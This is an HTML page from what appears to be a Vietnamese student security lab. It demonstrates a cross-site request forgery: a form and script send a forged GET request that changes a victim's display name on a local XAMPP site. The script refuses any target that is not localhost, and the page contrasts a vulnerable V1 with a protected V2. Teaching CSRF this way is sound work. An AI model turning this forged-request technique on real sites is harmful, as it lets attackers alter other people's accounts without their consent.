<!doctype html><html lang="vi"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CSRF attacker demonstration on localhost</title><style>body{font:15px Arial;background:#f6f4ee;color:#263c32;max-width:720px;margin:50px auto;padding:25px}main{background:white;border:1px solid #e0e3d6;padding:28px;border-radius:12px}input{display:block;padding:12px;width:100%;box-sizing:border-box;margin:10px 0 17px}button{background:#71866c;color:white;padding:13px 23px;border:0;border-radius:6px;cursor:pointer}.note{background:#f6eee5;padding:14px;border-radius:6px;line-height:1.7}</style></head><body><main><small>CÁ'S HOA / SECURITY LAB</small><h1>Attacker page — CSRF</h1><p>Chỉ thử nghiệm trên XAMPP và tài khoản giả. Đăng nhập nạn nhân trên http://localhost trước.</p><p class="note">Mở trang này qua http://127.0.0.1, giữ website nạn nhân tại http://localhost để tạo site khác. V1 cho phép GET cập nhật, V2 từ chối.</p><form id="attack"><label>Victim URL</label><input id="base" value="http://localhost/mid_term_lap_trinh_web/v1/update-profile.php"><label>Forged display name</label><input id="name" value="CSRF-Attacked"><button>Gửi GET giả mạo</button></form></main><script>document.getElementById('attack').addEventListener('submit',function(e){e.preventDefault();const u=new URL(document.getElementById('base').value);if(u.hostname!=='localhost'||!/^\/[a-zA-Z0-9_/-]+\/(v1|v2)\/update-profile\.php$/.test(u.pathname)){alert('Only localhost lab URLs are allowed.');return;}u.searchParams.set('display_name',document.getElementById('name').value);location.href=u.toString();});</script></body></html>
